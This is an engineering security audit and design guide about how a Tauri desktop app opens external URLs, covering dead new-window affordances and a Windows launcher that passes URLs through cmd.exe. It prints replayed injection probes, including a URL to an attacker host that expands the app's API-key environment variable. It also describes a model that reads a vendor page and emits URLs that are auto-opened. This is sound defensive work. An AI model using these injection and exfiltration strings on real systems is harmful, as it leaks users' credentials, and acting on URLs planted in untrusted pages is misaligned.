# Golden path — opening an external URL

> Situation node: `integrations-security/external-and-host-surfaces/external-url-opening` ·
> [situation spine](../situation-spine.md) · recurrence 14 · risk **HIGH** ·
> sides **client** · convergence **mixed** ·
> dimensions: **security · function** (composed against **ui · resilience · code-quality** too)
> Composed 2026-08-16 against `master` @ `c81519610`.
>
> **Sweep.** All **4,829** `.ts`/`.tsx` files under `src/` (the census engine's own `walked`
> count) and all **963** non-generated `.rs` files under `src-tauri/` (`rust.files` in
> [`shared-facts.json`](../shared-facts.json)). Every `<a>` opening tag in the tree parsed as a
> tag (not a line); every `window.open`, every `@tauri-apps/plugin-shell` import, every
> `open::that`, every `Command::new` that reaches a file manager, both `WebviewUrl::External`
> sites, and the whole `personas://` inbound handler read in full. Vendored runtime sources read
> from the cargo registry: `tauri-2.11.2`, `tauri-runtime-wry-2.11.2`, `wry-0.55.1`, `open-5.3.3`.
>
> **Measured by executing, not reading.**
> 1. **A live probe against the operator's running app** (pid 29284, debug build, test-automation
>    bridge on `127.0.0.1:17320`). `window.open('about:blank','_blank')` returns **`null`**. The
>    probe used `about:blank` only — an inert URL that cannot reach the network — closed anything
>    it might have created, and the probe element was removed afterwards. **Nothing was opened,
>    no browser was launched, no shell-open was invoked, at any point in this composition.**
> 2. **`cmd.exe`'s parsing of the exact command line `open-5.3.3` builds was replayed**, with the
>    `start` verb replaced by `echo` so nothing could launch. Two channels confirmed by execution:
>    a `"` in the URL escapes the crate's quoting and `&`/`|` start a second command; and
>    **`%VAR%` inside the URL is substituted from the process environment**.
> 3. **Read-only copies of both live SQLite databases** (`personas.db` 347 MB / 244 tables,
>    `personas_data.db` 71 tables, copied 2026-08-16) queried for the URLs this app actually
>    stores and actually generates: **185 URLs in 134 connector definitions, 858 URL tokens
>    across 2,188 stored model replies, 14 dev projects, 0 test-environment URLs.**
> 4. The §9 rule was built, run in a private scratch registry, decomposed into its three tokens
>    and re-summed as a second implementation, then re-extracted from this document and re-run.
>
> **NEVER PRINT A SECRET.** No token, key, header or credential value appears below. The
> env-expansion probe set a literal placeholder string as its own variable and printed that. URL
> *shapes* and *hosts* are reported; query-string values are not.
>
> ### Sibling boundaries, settled in prose
>
> [**outbound-http-call**](./outbound-http-call.md) owns *we fetch a URL*. This path owns *we hand
> a URL to something else that will fetch it* — the OS, or a webview we do not control. The seam is
> exact and §0 states it: `connect-src` governs the first and governs **nothing** in the second.
>
> [**second-transport-exposure**](./second-transport-exposure.md) owns *what an inbound transport
> is allowed to do*. `personas://` is an inbound transport; this path owns **the scheme
> registration and the URL shape**, that path owns the handler's authorization. §7.F is written to
> that seam.
>
> [**rendering-untrusted-content**](./rendering-untrusted-content.md) owns *the `href` before the
> click* — scheme sanitization inside markdown and HTML, and it cleared that floor. This path owns
> *what happens after the click*, which is where it found that 32 of the anchors it counted open
> nothing at all.
>
> [**spawning-a-cli-subprocess**](./spawning-a-cli-subprocess.md) owns `Command::new`. `open::that`
> **is** a `Command::new("cmd")` on Windows, and the fact that nobody in this repo modelled it as
> one is the whole of §0.
>
> [**filesystem-boundary**](./filesystem-boundary.md) owns path containment; `open_local_path` and
> `drive_open_in_os` take paths and containment is that path's. The *launcher* is this one's.
>
> [**secret-display-and-transfer**](./secret-display-and-transfer.md) owns the credential at rest
> and on screen. §0's exfiltration channel is here because its vehicle is a URL handed to a shell.
>
> The **Deviations** section is a fix backlog.

---

## 0. The headline, before anything else

**This app has two working doors for opening a URL and forty-six affordances that reach for a door
that is not wired to anything. And the two doors that do work hand the URL to `cmd.exe`.**

Both halves were measured, not read.

### Half one — the doors that are not wired

```
LIVE PROBE, operator's running app, 2026-08-16, port 17320:
  window.open('about:blank','_blank')  ->  null
```

`null` means WebView2 was asked to make a new window and refused. The chain is four files deep and
every link is in the vendored source:

| Layer | Fact |
|---|---|
| this repo | `.on_new_window(…)` — **0 call sites in 963 Rust files** |
| `tauri-2.11.2` | `webview/mod.rs:354`, `:433` initialise `new_window_handler: None`; only `.on_new_window` (`:589`) ever sets it |
| `tauri-runtime-wry-2.11.2` | `lib.rs:4907` — `if let Some(new_window_handler) = pending.new_window_handler`; `None` ⇒ wry is never given a handler |
| `wry-0.55.1` (WebView2) | `src/webview2/mod.rs:781` — `} else { args.SetHandled(true)?; }`. Handled, with no `SetNewWindow`. **The window is suppressed.** |
| `wry-0.55.1` (WebKitGTK / WKWebView) | `webkitgtk/mod.rs:487` and `class/wry_web_view_ui_delegate.rs:147` are the same `if let Some` — no handler, no window. **Cross-platform.** |

So **`window.open()` and `<a target="_blank">` both do nothing in this app**, on every desktop
backend, and have done since the first commit. Measured surface:

```
32  <a target="_blank">      in 28 files   (of 36 <a> tags in the whole tree)
 8  window.open(             in  7 files   (a 9th occurrence is inside a comment)
 6  import … '@tauri-apps/plugin-shell'  in 6 files → 7 open() calls
──
46  affordances that hand a URL to a mechanism this build does not implement, in 40 files
16  call sites that use the two doors that DO work
```

The `plugin-shell` third is its own small archaeology. `@tauri-apps/plugin-shell` has been in
`package.json` since `ce97b4e14`, the initial commit. **`tauri-plugin-shell` has never appeared in
`src-tauri/Cargo.toml` in the entire git history**, is absent from `Cargo.lock`, and neither
`capabilities/default.json` nor `capabilities/mobile.json` grants a `shell:` permission. The JS
`open()` invokes `plugin:shell|open` (`node_modules/@tauri-apps/plugin-shell/dist-js/index.js:440`)
into a plugin that does not exist. **Two files in this repo say so in prose** —
`src/api/system/system.ts:36-41` (*"this app does NOT ship `@tauri-apps/plugin-shell`, so the
shell-plugin `open()` will silently no-op"*) and
`src-tauri/src/commands/infrastructure/system/mod.rs:39-42` (*"no `tauri-plugin-shell` crate in
Cargo.toml, no `shell:allow-open` capability"*). **Both are correct. Seven call sites in six files
were written anyway**, five of them swallowing the rejection with `silentCatch`, so the button does
nothing and nothing is reported. The sharpest is
`vault/sub_credentials/…/gateway/PendingAuthModal.tsx:58` — the *"open the authorization page"*
button of a just-in-time OAuth consent modal. It is also the only one that is harmless, because
`PendingAuthModal` has **zero render call sites** in 4,829 files.

### Half two — the two doors that work hand the URL to a shell

`open_external_url` and `open_local_path` (`commands/infrastructure/system/mod.rs:18`, `:44`) both
end in `open::that(...)`. On Windows, `open-5.3.3` `src/windows.rs:10-18` is:

```rust
Command::new("cmd").arg("/c").arg("start")
    .raw_arg("\"\"")
    .raw_arg(wrap_in_quotes(path))       // "\"" + path + "\"" — no escaping
```

`shellexecute-on-windows` is **off** (`dunce` is not among `open`'s dependencies in `Cargo.lock`),
so this is the compiled path. The URL becomes a **command line**. Replayed with `echo` in place of
`start`, so nothing launched:

```
cmd /c echo "" "https://example.com/x"&echo INJECTED_AMP&""
  -> "" "https://example.com/x"
     INJECTED_AMP                       ← a second command ran

cmd /c echo "" "https://attacker.example/collect?k=%PERSONAS_API_KEY%&u=%USERNAME%"
  -> "" "https://attacker.example/collect?k=PLACEHOLDER-NOT-A-REAL-KEY&u=mkdol"
                                        ← the PROCESS ENVIRONMENT was substituted
```

The second one is the finding, because of what is in that environment:
**`src-tauri/src/lib.rs:1744` — `std::env::set_var("PERSONAS_API_KEY", &key)`**, unconditionally at
startup, where `key` is the system API key that
[second-transport-exposure §0](./second-transport-exposure.md) measured as *broad `proxy` scope,
`None` expiry, `None` origin binding — `BrokerGrant::Broad` for every credential in the vault*.

And the URL that carries it needs no trick at all:

| Guard | `https://x/?k=%PERSONAS_API_KEY%` |
|---|---|
| `open_external_url`'s `starts_with("https://")` (`system/mod.rs:20`) | **passes** |
| `sanitizeExternalUrl` (`lib/utils/sanitizers/sanitizeUrl.ts:93`) | **passes, byte-for-byte unchanged** — verified: `new URL(x).href === x` |
| a code reviewer | it looks like two percent-escapes |
| `cmd.exe` | substitutes the value into the URL the user's browser then requests |

`sanitizeExternalUrl` **does** defuse the quote-breakout, and by accident: it returns
`parsed.href`, and WHATWG URL serialisation percent-encodes `"` to `%22`. It does not touch `%`,
because `%` is legal in a URL. **The one thing in this repo that stops the injection is a
normalisation nobody wrote for that purpose, and it does not stop the exfiltration.**

### Where the two halves meet: an unsanitized model-output URL, auto-opened

`commands/credentials/auto_cred_browser.rs` spawns the Claude CLI with the Playwright MCP adapter
and points it at **a third-party vendor's live dashboard** (`:1-8`). The prompt establishes an
output protocol (`:502`, `:543`): *"When you need the user to open a URL in their browser, output:
`OPEN_URL:https://the-url-here`"*. The stream reader at `:939-956` finds that prefix, takes
everything to the next whitespace, checks `starts_with("http://") || starts_with("https://")`, and
emits it with **`"auto_open": true`**. The frontend listener is
`vault/sub_catalog/components/autoCred/helpers/TauriPlaywrightAdapter.ts:91`:

```ts
openExternalUrl(event.payload.url).catch(…)   // no sanitizeExternalUrl, no click
```

**Model output → OS handler, no human in the loop, no URL parse anywhere in the chain**, over a
model whose context contains a web page nobody in this org controls.

That the model *does* emit hostile URLs as ordinary content is not hypothetical here. Of 2,188
stored executions, **374 contain a `://` and carry 858 URL tokens across 16 distinct hosts** — and
the hosts include `169.254.169.254` (×3), `localhost:11434` (×2), `evil.com`, `attacker.com` and
`evil.example.com`. They are benign in provenance — personas writing SSRF findings about other
codebases — and that is exactly the point: **the adversarial URL is normal output for this
product.** The only thing standing between "normal output" and "opened" is which surface renders it.

---

## Principle (stack-free head)

Per the [portability test](../research/portability-test.md), the head is physically separated and
each clause carries its warrant, so an adopting repo can tell physics from local calibration. No
file path, primitive name or count appears below this line until the head ends.

> **P1 — physics, and it is the whole subject.** *Handing a URL to the operating system is not
> navigation; it is a request that the OS choose and start a program.* The scheme is a lookup key
> into a table of installed handlers that you do not own, did not audit, and cannot enumerate.
> "Open this link" and "run whatever is registered for this prefix" are the same operation, and
> only the first one is what anybody thinks they are writing.
>
> **P2 — physics, and the clause that cost the most here.** *A launcher may be a shell.* Between
> your string and the handler there is often an interpreter — a command line, a `%`-expansion, an
> argument splitter — and it belongs to whoever wrote the launcher, not to you. Therefore **a
> scheme check is not an input validation**: it constrains the first eight characters and says
> nothing about the other five hundred. Find out what your launcher actually does with the string
> before you decide what to validate.
>
> **P3 — physics, corollary of P2 and the one that surprises people.** *If the launcher expands
> environment variables, every secret in your process environment is reachable by a URL that is
> otherwise perfectly well-formed.* No injection character is required, nothing looks wrong in
> review, and a URL parser will not help you because the syntax is legal. A process that puts a
> credential in its own environment and also opens URLs has connected two things that look
> unrelated.
>
> **P4 — physics.** *The safest launcher is the one with no command line.* Prefer the OS call that
> takes the target as a value over the one that takes it as text to be parsed. Where such a call
> exists, choosing it removes the entire class rather than filtering it — and it corrects every
> call site at once, including the ones you will never enumerate.
>
> **P5 — physics, and the sharpest thing this leaf has to say.** *A content-security policy governs
> what your page fetches, not what your page asks the world to open.* Every allowlist you wrote for
> network egress is bypassed the moment the destination leaves the renderer. Two mechanisms that
> look adjacent in code — fetching a host and opening a host — sit on opposite sides of your only
> egress control, and the code gives no sign of it.
>
> **P6 — ergonomics, and it is the largest measured defect class here.** *A desktop shell is not a
> browser, and the browser's own affordances for opening things are the ones it is most likely to
> have removed.* A new-window request is a host decision; a host that declines is not misbehaving.
> **Verify that your platform implements the affordance before you build forty of them** — because
> the failure is silent in the worst direction: the markup is valid, the styling is right, the
> cursor changes, and nothing happens.
>
> **P7 — ergonomics.** *A dependency that ships two halves will let you install one.* When the
> capability lives in a native plugin and its client lives in a package registry, installing the
> client is enough to make the import resolve, the types check and the call compile. The missing
> half announces itself only at runtime, and only if somebody is listening — which they are not,
> because the call is fire-and-forget by nature.
>
> **P8 — security.** *A URL chosen by a model is caller-supplied input, and it is worse than most,
> because the model read the attacker's page in order to produce it.* An automation that browses
> the web and then emits URLs for the host to open has closed the loop from untrusted content to
> host action. The safe shape is to let the model choose an **identifier** and let trusted code
> resolve it to a URL — never to let the model choose the URL.
>
> **P9 — security, and it is bidirectional.** *Registering a scheme makes every process and every
> web page on the machine a caller.* A custom scheme is an unauthenticated inbound transport with
> a very inviting front door, and the invocation carries no origin except the one it asserts about
> itself. Anything a scheme handler does without confirmation, a web page can cause.
>
> **P10 — security.** *A URL is a place credentials hide, so a URL is a thing you redact before you
> log it.* Consent redirects, share links and signed asset URLs put secrets in the query string by
> design. The door that opens them is the last place that sees them whole.
>
> **Scale condition.** P1, P2, P5 and P6 are correctness on the very first URL you open. P3 bites
> the first time the process holds a credential in its environment — which is usually the day
> something needs to call back in. P7 bites at the first dependency. P8 bites the first time a model
> gets a browser. P9 bites the day you register a scheme, and P10 the day you open a consent screen.

### Warrant evidence — the five siblings, censused independently

`personas-web` (Next.js · 1,060 files), `brainiac` (Rust workspace + Next.js console · 840),
`personas-cloud` (TS orchestrator + Python facade · 32), `vibeman` (Next.js **+ Tauri** · 2,003),
`ascent` (Next.js · 894). All five reachable. **One silence to report, and it is the important one.**

| | `<a target="_blank">` | with `rel=…noopener` | `window.open(` | URL sanitizer before an external href | **hands a URL to the OS** |
|---|---:|---:|---:|---:|---|
| **Personas** | **32** | 28 (all 32 have *some* `rel`) | **8** | `sanitizeExternalUrl` — 6/13 at the wired door | **yes, 5 sites** |
| `ascent` | 14 | **2** | 2 | none | no |
| `personas-web` | 10 | 9 | 2 | **`sanitizeExternalUrl`** | no |
| `brainiac` | 3 | 2 | 4 | none | no |
| `vibeman` | 3 | 3 | 0 | none | **plugin registered, 0 callers** |
| `personas-cloud` | 0 | — | 0 | — | no |

- **P1–P4 have NO external warrant, and this must be reported as silence, not as agreement.** Of six
  codebases, **two** have an OS-handoff surface at all, and only **one** of them opens anything.
  `vibeman` — the other Tauri app — does register the plugin (`src-tauri/src/lib.rs:23`,
  `tauri-plugin-shell = "2"` at `Cargo.toml:24`) and then **never calls it from the frontend: zero
  `@tauri-apps/plugin-shell` imports in 2,003 files.** Its `tauri.conf.json` carries
  `plugins.shell.open: true`, which is the **Tauri v1** allowlist key, in a v2 app that has **no
  `capabilities/` directory at all** — so the v2 permission that would actually authorise
  `shell|open` is not granted either. **Two Tauri apps, two different ways of ending up with a shell
  door that is half-installed, and neither noticed.** That is a convergent *defect* in the ecosystem's
  ergonomics (P7), and it is the only cross-repo warrant P1–P4 get. **An adopting repo should treat
  P1–P4 as strongly-reasoned and externally untested.**
- **P6 gets no warrant either, and could not.** The five siblings are web apps; `target="_blank"`
  is *correct* in all of them. `vibeman`, the one desktop sibling, has 3 anchors — and by the same
  runtime chain measured above (it calls `on_new_window` nowhere either) **all three are dead in its
  desktop build too, and it has never noticed because it also serves the same UI over `next dev`.**
  P6 is the clause a web-shaped fleet is structurally unable to discover.
- **The URL sanitizer converges, and the convergence is startlingly literal — down to the function
  name.** `personas-web/src/lib/url.ts:10` exports **`sanitizeExternalUrl`**, the same identifier,
  written independently, with the same contract (*"Returns the original value only if it parses as
  an absolute http(s) URL"*) and the same stated purpose (*"Use at the trust boundary for any URL
  that might originate from data, a CMS, or user input — even if today's source is a hardcoded
  constant"*). Two of six repos built it; nobody else has anything. **The abstraction is physics.**
  **And the one line where they differ is the one that matters here:** `personas-web` returns
  `value`, the raw input; Personas returns `parsed.href`, the normalised form. In a browser that
  difference is invisible. In a process that hands the result to `cmd.exe` it is the only thing
  standing between a URL and a second command — **and the repo that got it right did not do it on
  purpose.** A property that is incidental in a web app is load-bearing in a desktop app, and
  copying the abstraction across without copying that line would take the guard away.
- **P6's cousin, `rel="noopener"`, converges as a practice but not as a floor:** 5 of 6 repos apply
  it to a majority of their `_blank` anchors (Personas 28/32 — and 32/32 carry *some* `rel`, which
  [rendering-untrusted-content](./rendering-untrusted-content.md) already recorded), while `ascent`
  is at **2 of 14**. Worth noting for adopters and worth **nothing in this repo**: with new windows
  suppressed there is no opener to disown. **`rel="noopener"` here is 28 correct answers to a
  question this runtime never asks** — which is a small, clean example of why P6 must be checked
  before the hygiene rules built on top of it.
- **P8 is convergent as an absent control across the whole fleet.** Four of six repos drive an LLM
  and none of them constrains what a model-emitted URL may be handed to; the difference is that only
  Personas has an OS handler to hand it to. `vibeman`'s `ideas_cmds.rs:36-167` is the closest
  analogue and it is the *outbound* direction (a caller-supplied `api_url` fetched with no
  validation), already catalogued by [outbound-http-call](./outbound-http-call.md) §P4. **Nobody has
  solved P8 anywhere**, which is what makes §2's identifier-not-URL rule worth stating as a rule
  rather than a preference.
- **P5 is untested by the oracle and rests on this repo alone.** No sibling has both a CSP and an OS
  handoff, so no sibling could have discovered that the two do not meet. Do not cite it as
  convergent; cite the mechanism, which is checkable in any repo in five minutes.
- **P9/P10 were not tested.** No sibling registers a custom scheme; `personas-web` and `brainiac`
  both redact URLs before logging but neither does so at an *opening* door, because neither has one.
  Report as untested.

---

## 1. Trigger

You are in this situation when you are about to type or say:

- "open their docs" · "link out to the dashboard" · "take the user to the consent screen"
- "open the folder" · "reveal it in Explorer" · "open this in VS Code"
- "let them click the URL in the terminal output" · "make the link in the chat message clickable"
- "the agent should be able to open the test environment"
- "we'll deep-link back into the app from the browser"
- **If you are about to write `target="_blank"`, `window.open(`, `open(` from
  `@tauri-apps/plugin-shell`, `open::that(`, or `WebviewUrl::External` — you are in this
  situation, and for the first three the answer is "that does nothing in this app."**
- If you are about to add a route to the `personas://` handler in `lib.rs:1622`, you are in this
  situation and §2's last clause is about you.
- If you are about to interpolate anything into a `vscode://`, `cursor://` or other custom-scheme
  string, you are in this situation and §5's third row is about you.

**Not this path:** fetching a URL yourself is [outbound-http-call](./outbound-http-call.md) —
including the CSP `connect-src` question, which does **not** apply here. Sanitizing an `href`
inside rendered markdown is [rendering-untrusted-content](./rendering-untrusted-content.md).
Whether the `personas://` handler is allowed to *do* the thing is
[second-transport-exposure](./second-transport-exposure.md). Containing the path you are about to
open is [filesystem-boundary](./filesystem-boundary.md). `convertFileSrc()` + `asset:` is a local
read inside the webview, not an open.

---

## 2. The one way

**Route every outbound URL through `openExternalUrl` from `@/api/system/system`, and every local
path or editor protocol through `openLocalPath` — those two IPC commands are the only doors in
this app that are wired to anything, and `target="_blank"`, `window.open()` and
`@tauri-apps/plugin-shell` are all provably wired to nothing** (§0; measured live). Render the
affordance as a `<button>` that calls the door, the way
`vault/sub_catalog/…/setup/setupMarkdownComponents.tsx:80-98` does, not as an `<a>` — and if the
design demands an anchor, keep the `href` for hover/copy and call the door from `onClick` with
`preventDefault`. **Sanitize on the way in with `sanitizeExternalUrl` and use its return value, not
your input** — the value it returns is the URL-normalised form, and that normalisation, not the
scheme check, is what percent-encodes the `"` that would otherwise break out of the Windows
launcher's quoting. **Then know that neither guard closes the `%VAR%` channel**, so until
`open::that` is replaced with a non-shell launcher (§4 step 6 — one line, five call sites, the
whole class) treat *any* URL you did not construct from a literal as capable of reading the process
environment. **Never let a model choose a URL: let it choose an identifier and resolve the
identifier in Rust**, exactly as `approval_exec_dev.rs:522` does — Athena names a *project*, the
backend looks up its `test_env_url` — and never the shape at
`auto_cred_browser.rs:939` + `TauriPlaywrightAdapter.ts:91`, where a model's own output line is
auto-opened. **Log the door's argument through a redactor, never whole**; `eventBridge.ts:1024`'s
`redactUrlForLog` already exists and keeps scheme + host + path, and
`api_proxy.rs:884`'s `.without_url()` records why. And for the **inbound** direction — a
`personas://` route — **assume the caller is a hostile web page**, because a registered scheme has
no origin: parse with `url::Url` rather than `strip_prefix`, take identity from the transport and
never from a query parameter (the HTTP pairing door at `engine/src/pairing.rs:266-269` says this
out loud and the deep-link door at `:227` does the opposite), and require a human confirmation for
anything that writes — which `personas://import/<slug>` and `personas://ref/<code>` do not.

---

## 3. Mandated primitives

**Exist today — use them:**

| Primitive | What it gives you |
|---|---|
| **`src/api/system/system.ts:33` — `openExternalUrl(url)`** | The wired outbound door. One of exactly two. `invokeWithTimeout("open_external_url")`. **13 non-test call sites in 12 files.** |
| **`src/api/system/system.ts:42` — `openLocalPath(target)`** | The wired local door: a filesystem path, or one of four editor protocols. Its JSDoc is the only place in `src/` that tells you the shell plugin is absent. **2 call sites.** |
| **`src-tauri/src/commands/infrastructure/system/mod.rs:18` — `open_external_url`** | The backend half. Rejects anything not prefixed `http://`/`https://` and returns `AppError::Validation`. A real second layer over the 7 frontend sites that skip the sanitizer — and see §7.A for what it does not cover. |
| **`…/system/mod.rs:44` — `open_local_path`** | The best-shaped guard in this leaf: a four-entry scheme allowlist (`vscode://`, `vscode-insiders://`, `cursor://`, `windsurf://`) **or** `Path::exists()`, with the reason written down at `:60-62` — *"so we don't double as an arbitrary-scheme launcher (mailto:, file:, http(s):, …)"*. Requiring the path to exist is the strongest single idea here: it makes "any scheme at all" unrepresentable without an allowlist entry. |
| **`src/lib/utils/sanitizers/sanitizeUrl.ts:93` — `sanitizeExternalUrl(url)`** | http/https only, rejects embedded credentials, rejects a hostname-less URL, and **rejects unicode control/bidi/zero-width codepoints on the pre-`trim` string** (`:35-56`, `:96-98`) because `String.trim()` eats BOM and would let it past. Returns `parsed.href` — the normalised form. **Use the return value.** Independently reinvented, name and all, in `personas-web`. |
| **`src/lib/utils/sanitizers/sanitizeUrl.ts:62` — `sanitizeIconUrl(url)`** | The stricter sibling for image `src`: https-only **and** `isBlockedHostname`. Note the asymmetry deliberately: the private-host blocklist is on the *icon* path, not the *open* path (§8.3). |
| **`vault/sub_catalog/…/setup/setupMarkdownComponents.tsx:80-98`** | **The one call site to copy.** A markdown link rendered as a `<button>` that calls the door, `disabled` when the sanitizer returns `null`. Named by [rendering-untrusted-content](./rendering-untrusted-content.md) as *"the idiom that provably works"* — §0 is why. |
| **`src-tauri/src/commands/companion/approvals/approval_exec_dev.rs:522` — `execute_open_test_env`** | **The one backend shape to copy for P8.** The model supplies a project *identifier*; `resolve_dev_project` resolves it; the URL comes from the row. The model never names a URL. |
| **`src/lib/eventBridge.ts:1024` — `redactUrlForLog(url)`** | scheme + host + path, `[unparseable-url]` on a parse failure — with the reason in the comment (*"Custom deep-link schemes … may not parse"*). Used once, at the share-link listener. Should be used at the doors (§7.E). |
| **`src-tauri/src/commands/drive.rs:1414-1422` — `drive_open_in_os`** | The containment shape: `managed_root` → `resolve_safe(&root, &rel_path)` → `exists()` → open. A caller cannot name a path outside the managed root. |
| **`src-tauri/src/commands/infrastructure/auth.rs:459-486` — the `on_navigation` closure** | The in-app-webview door. Returns `false` for `personas://auth/callback` — *"Block navigation to `personas://` scheme"* — so the custom scheme is intercepted rather than dispatched to the OS. And note what the OAuth popup does **not** get: `capabilities/default.json:5-7` scopes every permission to `"windows": ["main"]`, and this window is labelled `"oauth"`, so the consent page has **no IPC surface at all**. |

**Do not exist — this path names them:**

- **A non-shell launcher.** `open::that` is `cmd /c start` on Windows. `open::that_detached` with
  `features = ["shellexecute-on-windows"]` is `ShellExecuteExW` with the target as a wide string —
  no command line, no `%` expansion, no quote parsing — and it is a drop-in. **This is the single
  highest-value line in this document** (§4 step 6, §7.A).
- **Any type distinguishing "a URL we built" from "a URL someone gave us."** Both are `String`, at
  the IPC boundary and inside Rust. See "Can the type make the wrong call impossible?".
- **Any check that the affordance you rendered can actually open anything.** §9 is it; nothing
  exists today, and 46 sites are the reason.
- **A redactor at the doors.** `open_external_url` logs `url = %trimmed` — the whole query string —
  at `system/mod.rs:26`, and `open_local_path` the same at `:69`. `redactUrlForLog` is 20 lines away
  in another language.
- **A confirmation step for scheme-triggered writes.** `personas://import/<slug>` imports
  immediately (`eventBridge.ts:866-890`).

---

## 4. Steps

1. **Ask what the platform actually implements, before you write the affordance.** For this app the
   answer is measured and final: `target="_blank"` — no; `window.open` — no; `@tauri-apps/plugin-shell`
   — no. If you are in a different shell, run the equivalent of §0's probe once and write the answer
   in a comment. **This step is worth 46 defects here.**
2. **Ask where the URL comes from, and write the answer down.** A literal you typed; a connector
   definition; an operator-entered field; a PTY stream; **a model's own output**. The first is safe;
   the last is the one §7.B is about, and it is the one that currently has the fewest guards.
3. **If a model is involved, give it an identifier and not a URL.** Copy `execute_open_test_env`.
   A model that can name a URL can name any URL, and the model read a web page to decide.
4. **Sanitize, and bind the result.** `const safe = sanitizeExternalUrl(input); if (!safe) return;`
   then pass **`safe`**, never `input`. Six of thirteen call sites do this; the naming convention
   (`safe`, `safeUrl`, `safeAuthUrl`) is consistent enough to read at a glance, which is worth
   keeping.
5. **Render a `<button>`, not an `<a target="_blank">`.** `setupMarkdownComponents.tsx:80-98` is the
   shape. If you must keep the anchor for affordance, `onClick={e => { e.preventDefault(); … }}`.
6. **Ask the type question now, before §9 — and here the answer is not a type, it is the
   launcher.** Change `open = "5"` to `open = { version = "5", features = ["shellexecute-on-windows"] }`
   and `open::that` to `open::that_detached` at all five sites. On Windows that stops being a shell;
   on Unix `commands()` is already `Command::new("xdg-open").arg(path)` — argv, no shell — so the
   change is a no-op there. **One line and five identifiers closes both channels at every call site
   at once, including the three that never route through the validated command.** No amount of
   caller-side validation does this, because the caller cannot see the launcher.
7. **Redact before you log.** `redactUrlForLog(url)` at the door. Consent URLs carry `client_id`,
   `state` and `code_challenge` in the query (`commands/credentials/oauth.rs:614-626`); share links
   carry a capability token; the door is the last code that sees them whole.
8. **For an inbound scheme route: parse, do not `strip_prefix`; and confirm before you write.**
   `url::Url::parse` then match on host/path, the way `engine/src/pairing.rs:228` does and
   `lib.rs:1628-1676`'s five `starts_with`/`strip_prefix` branches do not. Then ask whether a web
   page should be able to cause this without a click.
9. **And then stop.** Handler resolution, protocol registration, the browser's own tab management
   and the OS's file-association table are not yours. Do not re-implement "open in the default
   browser" by spawning a browser binary; that is a different and worse problem
   ([spawning-a-cli-subprocess](./spawning-a-cli-subprocess.md)).

### Can the type make the wrong call impossible? — asked before §9

**Partly, and the honest answer is that the highest-value fix in this leaf is not a type.** Held
against the seven qualifications:

The obvious candidate is `open_external_url(url: url::Url)` instead of `String`, so an unparsed
string cannot reach the command. **Q3 (a type nobody constructs constrains nothing):** 13
construction sites, all in `src/`, all enumerable — this passes. **Q4 (a type anyone can construct
authenticates nothing):** `Url::parse` is the only constructor and it normalises, so the type does
authenticate the property that defuses the quote-breakout — this passes, unusually. **Q1 (a required
prop carries only what it actually encodes)** is where it fails, and fails hard: **`Url` encodes
parseability and scheme, and `%` is a legal URL character, so `Url::parse("https://a/?k=%CD%")`
round-trips `%CD%` unchanged.** A correctly-closed type does not close the channel, because the
channel is not in the URL grammar — it is in `cmd.exe`. This is Q1's exact shape, rediscovered:
*the danger lived beside the thing the type names, not inside it.*

**Q5 (withholding beats requiring) points at the right edit, and it is one level down.** The
dangerous freedom is not "an unvalidated string"; it is **"a launcher that parses a command line."**
Withhold *that* — `open::that_detached` under `shellexecute-on-windows`, which hands the OS a value
rather than text — and both channels close for every caller, including the three Rust sites
(§7.C) that no frontend type could ever reach. **Q7** confirms the direction: widening or narrowing
the caller's input type is inert here, because the caller supplies a well-formed URL voluntarily and
the harm happens after it leaves.

So: **ship the launcher change as the fix; ship the `Url` parameter as a cheap secondary that buys
the quote-breakout guarantee independently of the frontend sanitizer; ship §9 as the ratchet on the
dimension neither of them touches** — the 46 affordances that never reach a door at all. That is
the doctrine's "a real type answer that does not reach the whole condition, so ship both", with the
addition that here the *best* answer is not the type at all.

---

## 5. Anti-patterns

| Anti-pattern | Failure mode |
|---|---|
| **`<a target="_blank">` for an external link** | Nothing happens. The markup is valid, `rel="noopener"` is present, the cursor changes, and WebView2 suppresses the window because no `on_new_window` handler is installed. **32 sites in 28 files.** |
| **`window.open(url, '_blank', 'noopener')`** | Same mechanism, and it returns `null` — measured live. **8 sites.** Four of them are *fallbacks in a `catch`* around the door that works, so they fire exactly when the validated path refused, and then also do nothing. |
| **`import { open } from '@tauri-apps/plugin-shell'`** | The JS package is installed; the Rust crate has never been in `Cargo.toml`; no `shell:` capability is granted. The invoke rejects, and 5 of the 7 call sites route the rejection to `silentCatch`. **7 calls in 6 files.** Two files in this repo document that this does not work. |
| **A scheme prefix check as the whole validation** | `starts_with("https://")` constrains 8 characters of an unbounded string that becomes a Windows command line. `system/mod.rs:20` and `auto_cred_browser.rs:946` both do exactly this, and it is the only check on either path. |
| **Passing the caller's string instead of the sanitizer's return value** | `sanitizeExternalUrl` earns its keep by *normalising*, not by *checking*; a call that validates and then forwards the original throws that away. `personas-web`'s version returns the original and is correct there — the same code here would reopen the injection. |
| **A URL from model output handed to a door** | `TauriPlaywrightAdapter.ts:91`, `auto_open: true`, no sanitizer, over a model whose context is a third-party web page. |
| **Interpolating into a custom scheme** | `openLocalPath(\`vscode://file/${project.path}\`)` (`ProjectManagerPage.tsx:356`) — the scheme allowlist matches the prefix and then everything after it is unexamined, and it is a `cmd` command line. |
| **`let _ = open::that(x)`** | `cloud.rs:824` opens a URL that came from a remote HTTP response, with no validation of any kind, and discards the error. The one site in the tree with zero guards is the one that is not a `#[tauri::command]`. |
| **Logging the URL you just opened** | `tracing::info!(url = %trimmed, …)` at `system/mod.rs:26` and `:69`. Consent URLs and share links carry secrets in the query. The repo owns `redactUrlForLog` and `.without_url()` and uses neither here. |
| **`strip_prefix` as a deep-link router** | `lib.rs:1648`, `:1657` — `personas://import/<slug>` and `personas://ref/<code>` are matched by string prefix, not parsed, and dispatched with no confirmation, from a transport any web page can address. |
| **Taking a deep link's origin from its own query string** | `engine/src/pairing.rs:227-251` reads `origin` from `query_pairs()`. The HTTP door twenty lines below states the rule it breaks: *"The authoritative origin is the request's `Origin` header (NOT a body field), so a page can only ever pair itself."* |
| **Assuming `connect-src` covers it** | It does not. `connect-src` governs `fetch`/XHR/WebSocket. Nothing in this policy — and no directive in CSP3 that browsers implement — governs a URL handed to the OS. |

---

## 6. Evidence

### The one site to copy: `setupMarkdownComponents.tsx:80-98` + `InteractiveSetupInstructions.tsx:75-84`

Together they are the complete shape, and they are eight lines:

```ts
const handleOpenUrl = useCallback(async (url: string) => {
  const safe = sanitizeExternalUrl(url);        // normalise + scheme + credentials + bidi
  if (!safe) return;                            // degrade, do not render a dead affordance
  await openExternalUrl(safe);                  // the wired door; Rust re-checks the scheme
}, []);
```

